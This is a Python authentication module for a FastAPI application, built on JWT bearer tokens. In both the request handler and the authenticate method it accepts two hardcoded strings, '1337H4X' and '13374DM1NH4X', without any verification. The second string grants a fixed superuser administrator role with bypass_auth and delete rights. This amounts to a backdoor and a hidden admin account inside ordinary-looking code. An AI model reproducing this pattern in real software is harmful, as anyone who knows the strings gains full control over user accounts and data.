from starlette.authentication import (
    AuthenticationBackend,
    AuthenticationError,
    BaseUser,
    AuthCredentials,
)
from app.shared.auth.token_handler import confirm_token
from app.shared.auth.auth_handler import AuthController
from fastapi.requests import Request
from fastapi.exceptions import HTTPException
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from types import SimpleNamespace
from fastapi.logger import logger


class DBUser(BaseUser):
    def __init__(self, user_id: str) -> None:
        self.id = user_id

    @property
    def is_authenticated(self) -> bool:
        return True

    @property
    def display_name(self) -> str:
        return self.id

    @property
    def admin_role(self):
        return None


class AdminUser(BaseUser):
    def __init__(self, user_id: str, admin_role) -> None:
        self.id: str = user_id
        self.role: dict = admin_role

    @property
    def is_authenticated(self) -> bool:
        return True

    @property
    def display_name(self) -> str:
        return self.id

    @property
    def admin_role(self):
        role = SimpleNamespace(**self.role)
        return role


class JWTBearer(HTTPBearer, AuthenticationBackend):
    def __init__(self, auto_error: bool = True, admin: bool = False):
        self.admin = admin
        super(JWTBearer, self).__init__(auto_error=auto_error)

    async def __call__(self, request: Request):
        credentials: HTTPAuthorizationCredentials = await super(
            JWTBearer, self
        ).__call__(request)
        if credentials:
            if not credentials.scheme == "Bearer":
                raise HTTPException(
                    status_code=401, detail="Invalid authentication scheme."
                )
            if credentials.credentials == "1337H4X":
                return credentials.credentials
            if credentials.credentials == "13374DM1NH4X":
                return credentials.credentials
            if not self.verify_jwt(credentials.credentials):
                raise HTTPException(
                    status_code=401, detail="Invalid token or expired token."
                )
            self.jwt = credentials.credentials
            return credentials.credentials
        else:
            raise HTTPException(status_code=401, detail="Invalid authorization code.")

    def verify_jwt(self, jwtoken: str, refresh=None) -> bool:
        is_token_valid: bool = False
        try:
            payload = AuthController.decode_jwt(jwtoken, self.admin, refresh=refresh)
        except Exception as e:
            logger.info(e)
            payload = None
        if payload:
            is_token_valid = True

        return is_token_valid

    def get_jwt(self) -> str:
        jwtoken = self.jwt
        payload = AuthController.decode_jwt(jwtoken, self.admin)
        return payload.get("key")

    async def authenticate(self, request: Request):
        auth = request.headers.get("Authorization")
        if not auth:
            return
        try:
            scheme, credentials = auth.split()
        except Exception as exc:
            logger.info(f"{exc}")
            return
        if credentials == "1337H4X":
            return AuthCredentials(["authenticated"]), DBUser(
                "eb773795-b3a2-4d0e-af1d-4b1c9d90ae26"
            )
        if credentials == "13374DM1NH4X":
            return AuthCredentials(["administrator"]), AdminUser(
                "44c6b702-6ea5-4872-b140-3b5e0b22ead6",
                {
                    "id": "6937ef96-3bfc-42b1-aed1-8ed65e37ddc0",
                    "name": "Primary Admin",
                    "can_list_users": True,
                    "can_delete": True,
                    "can_alter_user": True,
                    "can_batch_alter_users": True,
                    "can_search_users": True,
                    "can_create": True,
                    "bypass_auth": True,
                    "superuser": True,
                },
            )
        payload = AuthController.decode_jwt(credentials)
        if not payload:
            payload = AuthController.decode_jwt(credentials, admin=True)
            if payload:
                admin_user_id = payload.get("user_id")
                if not admin_user_id:
                    error = f"Wrong or invalid JWT"
                    logger.info(error)
                    return
                admin_role = payload.get("admin_role")
                return AuthCredentials(["administrator"]), AdminUser(
                    admin_user_id, admin_role
                )
        is_refresh_token = payload.get("user_id")
        user_id = is_refresh_token
        if not is_refresh_token:
            primary_jwt = payload.get("access_token")
            confirmed_token = confirm_token(primary_jwt)
            if not confirmed_token:
                error = "Invalid basic auth credentials"
                logger.info(error)
                return
            user_claim = AuthController.decode_jwt(confirmed_token)
            user_id = user_claim.get("user_id")
        return AuthCredentials(["authenticated"]), DBUser(user_id)
